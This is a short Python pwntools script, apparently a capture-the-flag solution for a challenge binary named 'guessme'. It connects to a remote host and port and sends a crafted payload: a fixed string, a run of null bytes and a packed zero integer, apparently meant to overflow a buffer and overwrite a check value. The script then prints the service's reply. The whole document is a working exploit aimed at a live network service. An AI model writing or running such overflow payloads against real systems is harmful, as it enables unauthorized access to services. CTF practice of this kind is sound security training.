from pwn import *

#io = process('./guessme')
io = remote('125.235.240.166',20102)

print(io.recv())

pl = b'9a9c88bb'+b'\0'*22+p32(0)

io.sendline(pl)

print(io.recvall())
